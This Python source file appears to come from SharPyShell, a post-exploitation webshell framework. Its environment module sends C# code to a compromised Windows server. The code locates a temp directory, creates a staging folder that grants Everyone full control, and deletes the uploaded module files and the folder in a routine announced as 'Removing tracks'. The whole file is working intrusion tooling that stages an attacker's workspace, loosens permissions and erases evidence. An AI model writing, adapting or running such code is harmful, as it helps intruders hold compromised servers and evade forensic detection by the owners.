from core.Module import Module, ModuleException


class GetTempDirectory(Module):
    class GetTempDirectoryException(ModuleException):
        pass

    _exception_class = GetTempDirectoryException

    _runtime_code = r"""
                using System;using System.IO;using System.Diagnostics;using System.Text;
                public class SharPyShell
                {                    
                    private string GetTempDirectory()
                    {
                        string tempDirectory="";
                        string osTempDirectory = Environment.GetEnvironmentVariable("SYSTEMROOT") + "\\" + "Temp";
                        string osPublicDirectory = Environment.GetEnvironmentVariable("Public");
                        if(Directory.Exists(osTempDirectory))
                            tempDirectory=osTempDirectory;
                        else
                            if(Directory.Exists(osPublicDirectory))
                                tempDirectory=osPublicDirectory;
                            else
                                tempDirectory=@"C:\Windows\Temp";
                        return tempDirectory;
                    }
                    
                    public byte[] ExecRuntime()
                    {
                        string output_func=GetTempDirectory();
                        byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                        return(output_func_byte);
                    }
                }
    """

    def _create_request(self, args):
        return self._runtime_code


class GetEnvDirectory(Module):
    class GetEnvDirectoryException(ModuleException):
        pass

    _exception_class = GetEnvDirectoryException

    _runtime_code = r"""
                using System;using System.IO;using System.Diagnostics;using System.Text;
                using System.Security.AccessControl;using System.Security.Principal;
                
                public class SharPyShell
                {                    
                    private string GetEnvDirectory(string randomName)
                    {
                        string envDirectory="";
                        string osTempDirectory = Environment.GetEnvironmentVariable("SYSTEMROOT") + "\\" + "Temp" + "\\" + randomName;
                        string osPublicDirectory = Environment.GetEnvironmentVariable("Public") + "\\" + randomName;
                        try{
                            System.IO.Directory.CreateDirectory(osTempDirectory);
                            envDirectory = osTempDirectory;
                        }
                        catch{
                            try{
                                System.IO.Directory.CreateDirectory(osPublicDirectory);
                                envDirectory = osPublicDirectory;
                            }
                            catch{
                                envDirectory = @"C:\Windows\Temp";
                            }
                        } 
                        if(envDirectory != @"C:\Windows\Temp"){
                            DirectoryInfo dInfo = new DirectoryInfo(envDirectory);
                            DirectorySecurity dSecurity = dInfo.GetAccessControl();
                            dSecurity.AddAccessRule(new FileSystemAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), FileSystemRights.FullControl, InheritanceFlags.ObjectInherit | InheritanceFlags.ContainerInherit, PropagationFlags.NoPropagateInherit, AccessControlType.Allow));
                            dInfo.SetAccessControl(dSecurity);
                        }
                        return envDirectory;
                    }

                    public byte[] ExecRuntime()
                    {
                        string output_func=GetEnvDirectory(@"%s");
                        byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                        return(output_func_byte);
                    }
                }
    """

    def _create_request(self, args):
        if len(args) < 1:
            random_name_directory = 'sharpyshell'
        else:
            random_name_directory = args[0] if args[0] != '' else 'sharpyshell'
        return self._runtime_code % random_name_directory


class ClearDirectories(Module):
    class ClearDirectoriesException(ModuleException):
        pass

    _exception_class = ClearDirectoriesException

    _runtime_code = r"""
                using System;using System.IO;using System.Diagnostics;using System.Text;
                public class SharPyShell
                {                    
                    private string ClearDirectories(string[] modulesPath, string envDirectory)
                    {
                        string output="";
                        for(int i = 0 ; i < modulesPath.Length ; i++)
                        {
                            try{
                                if(File.Exists(modulesPath[i])){
                                    File.Delete(modulesPath[i]);
                                    output += "File Removed-->" + modulesPath[i] + "\n";
                                }
                                else
                                    output += "File Not Found-->" + modulesPath[i] + "\n";
                            }
                            catch{
                                output += "File Not Removed-->" + modulesPath[i] + "\n";
                            }
                        }
                        try{
                            if(Directory.Exists(envDirectory)){
                                Directory.Delete(envDirectory);
                                output += "Directory Removed-->" + envDirectory + "\n";
                            }
                            else
                                output += "Directory Not Found-->" + envDirectory + "\n";
                        }
                        catch{
                            output += "Directory Not Removed-->" + envDirectory + "\n";
                        }
                        return output;
                    }

                    public byte[] ExecRuntime()
                    {
                        string[] modulesPath = %s;
                        string envDirectory = @"%s";
                        string output_func=ClearDirectories(modulesPath, envDirectory);
                        byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                        return(output_func_byte);
                    }
                }
    """

    def _create_request(self, args):
        if len(args) < 2:
            modules_path = '{}'
            env_directory = r'C:\Windows\Temp\sharpyshell'
        else:
            modules_path = args[0]
            env_directory = args[1]
        return self._runtime_code % (modules_path, env_directory)


class Environment:
    def __init__(self, password, channel_enc_mode, request_object):
        self.env_settings = {}
        self.temp_dir_obj = GetTempDirectory(password, channel_enc_mode, {}, request_object)
        self.env_dir_obj = GetEnvDirectory(password, channel_enc_mode, {}, request_object)
        self.clear_dir_obj = ClearDirectories(password, channel_enc_mode, {}, request_object)

    def __get_temp_dir(self):
        temp_dir = self.temp_dir_obj.run([])
        if '{{{PythonError}}}' in temp_dir:
            return temp_dir
        if '{{{GetTempDirectoryException}}}' in temp_dir:
            temp_dir = r'C:\Windows\Temp'
        return temp_dir.strip()

    def make_env(self, random_name_dir):
        temp_dir = self.__get_temp_dir()
        if '{{{PythonError}}}' in temp_dir:
            return '{{{Offline}}}' + temp_dir
        env_settings = dict()
        env_settings['working_directory'] = temp_dir
        env_directory = self.env_dir_obj.run([random_name_dir])
        if '{{{GetEnvDirectoryException}}}' in env_directory:
            env_directory = r'C:\Windows\Temp'
        else:
            env_directory = env_directory.strip()
        env_settings['env_directory'] = env_directory
        return env_settings

    def clear_env(self, env_settings):
        def format_output(text):
            output = ''
            for line in text.rstrip('\n').split('\n'):
                line_splitted = line.split('-->')
                output += '{: <21} --> {}\n'.format(*line_splitted)
            return output

        env_directory = env_settings['env_directory']
        excluded_path = ['env_directory', 'working_directory']
        modules_path = ['@"' + v + '"' for k, v in env_settings.items() if k not in excluded_path]
        modules_path_string_array = '{' + ','.join(modules_path) + '}'
        print ('\nRemoving tracks....\n')
        result = self.clear_dir_obj.run([modules_path_string_array, env_directory])
        if '{{{ClearDirectoriesException}}}' not in result:
            result = format_output(result)
        else:
            result = ''
        return result
